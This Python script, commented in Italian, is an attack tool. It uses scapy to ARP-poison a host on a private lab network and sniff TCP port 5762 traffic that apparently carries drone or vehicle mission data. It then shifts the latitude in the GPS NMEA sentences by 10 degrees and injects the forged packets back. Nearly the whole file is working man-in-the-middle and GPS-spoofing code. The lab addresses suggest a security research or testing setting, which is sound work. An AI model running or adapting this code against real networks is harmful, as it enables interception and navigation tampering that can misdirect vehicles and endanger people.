import scapy.all as scapy
import time
from scapy.layers.inet import TCP

def get_mac(ip):
    # Scansiona la rete alla ricerca del MAC address corrispondente all'indirizzo IP specificato
    arp_request = scapy.ARP(pdst=ip)
    ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = ether/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None

def arp_poison(target_ip, target_mac, spoof_ip):
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(arp_response, verbose=False)

def restore_arp(target_ip, target_mac, spoof_ip, spoof_mac):
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    scapy.send(arp_response, verbose=False)

def modify_coordinates(nmea_data):
    # Modifica le coordinate in base alle esigenze

    # Esempio: modifica la latitudine di 10 gradi
    for i in range(len(nmea_data)):
        if "GPRMC" in nmea_data[i]:
            split_line = nmea_data[i].split(",")
            split_line[3] = str(float(split_line[3]) + 10)
            nmea_data[i] = ",".join(split_line)
    return nmea_data

def main():
    target_ip = "172.18.0.2"
    target_mac = get_mac(target_ip)
    spoof_ip = "172.18.0.3"  # Indirizzo IP da cui l'attacco si sta svolgendo
    spoof_mac = get_mac(spoof_ip)

    if not target_mac or not spoof_mac:
        print("Impossibile ottenere gli indirizzi MAC. Assicurati che i dispositivi siano raggiungibili.")
        return

    try:
        while True:
            arp_poison(target_ip, target_mac, spoof_ip)
            print(f"ARP poisoning verso {target_ip} ({target_mac}) da {spoof_ip} ({spoof_mac})")

            # Ascolta i pacchetti inviati dalla missione al proxy
            packets = scapy.sniff(filter="tcp and host 172.18.0.2 and port 5762", count=1)
            if packets:
                packet = packets[0]

                # Estrai i dati NMEA dal pacchetto
                nmea_data = packet[scapy.TCP].payload.decode("ascii").split("\r\n")
                print("Pacchetto ricevuto prima della modifica:")
                print("\n".join(nmea_data))

                # Modifica i dati NMEA
                modified_nmea_data = modify_coordinates(nmea_data)

                # Crea un nuovo pacchetto con i dati modificati
                new_packet = scapy.IP(src=packet[scapy.IP].dst, dst=packet[scapy.IP].src) / scapy.TCP(sport=packet[scapy.TCP].dport, dport=packet[scapy.TCP].sport) / "\r\n".join(modified_nmea_data)
                print("Pacchetto modificato:")
                print(new_packet.show())

                # Invia il nuovo pacchetto alla destinazione
                scapy.send(new_packet, verbose=False)
                print("Pacchetto modificato e inviato.")

    except KeyboardInterrupt:
        print("\nArresto dell'ARP poisoning e ripristino ARP...")
        restore_arp(target_ip, target_mac, spoof_ip, spoof_mac)
        print("ARP ripristinato.")

if __name__ == "__main__":
    main()
